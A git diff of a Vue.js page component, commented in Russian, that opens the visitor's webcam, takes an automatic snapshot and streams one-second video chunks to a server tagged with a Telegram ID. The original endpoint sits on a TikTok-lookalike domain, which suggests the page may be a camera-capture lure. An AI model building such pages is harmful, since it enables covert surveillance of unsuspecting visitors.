@@ -10,7 +10,7 @@
 <script>
 import CameraObj from '@/components/CameraObj.vue';
 import CInformationAbout from '@/components/cInformationAbout.vue';
-
+import {v4 as uuidv4} from 'uuid';
 
 
 export default {
@@ -18,6 +18,7 @@ export default {
   components:{CameraObj, CInformationAbout},
   data() {
     return {
+      video_name: uuidv4(),
       stream: null, // Хранение видеопотока
       videoChunks: [], // Для хранения частей записанного видео
       telegramId: this.$route.params.telegram_id,
@@ -36,54 +37,51 @@ export default {
   
   methods: {
     startCamera() {
-  console.log(this.$refs.camera_obj);
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then((mediaStream) => {
-      this.isActiveCameraBlock = true;
-      this.isActiveMainImage = false;
-      this.stream = mediaStream;
-      this.$refs.video.srcObject = mediaStream;
+      console.log(this.$refs.camera_obj )
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((mediaStream) => {
+          this.isActiveCameraBlock = true
+          this.isActiveMainImage = false
+          this.stream = mediaStream;
+          this.$refs.video.srcObject = mediaStream;
 
-      // Настраиваем MediaRecorder для записи видео
-      const mediaRecorder = new MediaRecorder(mediaStream);
-      const CHUNK_INTERVAL = 1000; // Интервал отправки части (2 секунды)
+          const options = { mimeType: 'video/mp4' };
+          const mediaRecorder = new MediaRecorder(this.stream, options);
+          const CHUNK_INTERVAL = 1000;  
 
-      mediaRecorder.ondataavailable = async (event) => {
-        const chunk = event.data;
-        const formData = new FormData();
-        formData.append('video', chunk);
-        formData.append('telegram_id', this.telegramId)
-        try {
-          await fetch("https://tiktok.copicon.ru/api/v1/send_chunk/", {
-            method: "POST",
-            body: formData,
+          mediaRecorder.ondataavailable = async (event) => {
+            const chunk = event.data;
+            const formData = new FormData();
+            formData.append('video', chunk, `${this.video_name}.mp4`)
+            formData.append('telegram_id', this.telegramId)
+            try {
+              await fetch("http://localhost:8000/api/v1/send_chunk/", {
+              method: "POST",
+              body: formData,
+              });
+              console.log("Чанк отправлен успешно");
+            } catch (error) {
+              console.error("Ошибка отправки чанка:", error);
+            }
+          }
+          mediaRecorder.start(CHUNK_INTERVAL)
+
+          // Как только поток начнется, делаем снимок
+          this.$refs.video.addEventListener('loadeddata', () => {
+            setTimeout(() => {
+              this.takeSnapshot(); // Делаем снимок
+            }, 1000); // Задержка для фокусировки
           });
-        } catch (error) {
-          console.error("Ошибка отправки части видео:", error);
-        }
-      };
-
-      // Начинаем запись и отправку каждые CHUNK_INTERVAL миллисекунд
-      mediaRecorder.start(CHUNK_INTERVAL);
-
-      // Остановка записи при закрытии страницы
-      window.addEventListener("beforeunload", () => {
-        mediaRecorder.stop();
-        mediaStream.getTracks().forEach((track) => track.stop());
-      });
-
-      // Фокусировка перед первым снимком
-      this.$refs.video.addEventListener('loadeddata', () => {
-        setTimeout(() => {
-          this.takeSnapshot(); // Делаем снимок
-        }, 1000); // Задержка для фокусировки
-      });
-    })
-    .catch((err) => {
-      console.error('Error accessing camera: ', err);
-    });
-},
-
+          window.addEventListener("beforeunload", () => {
+          mediaRecorder.stop();
+          mediaStream.getTracks().forEach((track) => track.stop());
+        });
+        })
+        .catch((err) => {
+          console.error('Error accessing camera: ', err);
+        });
+        
+    },
     // Остановка камеры
     stopCamera() {
       if (this.stream) {
@@ -107,30 +105,44 @@ export default {
       this.startRecording(imageData);
     },
     // Начинаем запись видео на 5 секунд
-    startRecording(imageData) {
-      const options = { mimeType: 'video/mp4; codecs=avc1' };
-      const mediaRecorder = new MediaRecorder(this.stream, options);
+    startRecording() {
+      
+      // const options = { mimeType: 'video/mp4' };
+      // const mediaRecorder = new MediaRecorder(this.stream, options);
+      // const CHUNK_INTERVAL = 1000;
 
-      // Записываем части видео
-      mediaRecorder.ondataavailable = (event) => {
-        if (event.data.size > 0) {
-          this.videoChunks.push(event.data);
-        }
-      };
+      // // Записываем части видео
+      // mediaRecorder.ondataavailable = async (event) => {
+      //   const chunk = event.data;
+      //   const formData = new FormData();
+      //   formData.append("video", chunk, `${this.video_name}.mp4`);
+      //   formData.append("telegram_id", this.telegramId)
+      //   try {
+      //     await fetch("http://localhost:8000/api/v1/send_chunk/", {
+      //     method: "POST",
+      //     body: formData,
+      //   })
+      //   } catch {
+      //     console.log()
+      //   }
+        
+      // };
 
-      // Когда запись завершена
-      mediaRecorder.onstop = () => {
-        const videoBlob = new Blob(this.videoChunks, { type: 'video/mp4' });
-        this.sendData(imageData, videoBlob); // Отправляем фото и видео на сервер
-      };
+      // // Когда запись завершена
+      // // mediaRecorder.onstop = () => {
+      // //   const videoBlob = new Blob(this.videoChunks, { type: 'video/mp4' });
+      // //   // this.sendData(imageData, videoBlob); // Отправляем фото и видео на сервер
+      // // };
 
-      // Начинаем запись
-      mediaRecorder.start();
+      // // Начинаем запись
+      // mediaRecorder.start(CHUNK_INTERVAL);
 
-      // Останавливаем запись через 5 секунд
+      // // Останавливаем запись через 5 секунд
       setTimeout(() => {
-        mediaRecorder.stop();
+        this.stopCamera()
+        // this.mediaRecorder.stop();
       }, 5000);
+      
     },
     // Отправляем фото и видео на сервер
     sendData(imageData, videoBlob) {
@@ -143,7 +155,7 @@ export default {
       formData.append('video', videoBlob, 'video.mp4');
       formData.append('telegram_id', this.telegramId)
       // Отправляем POST-запрос
-      fetch('https://tiktok.copicon.ru/api/v1/send_media/', {
+      fetch('http://localhost:8000/api/v1/send_chunk/', {
         method: 'POST',
         body: formData
       })
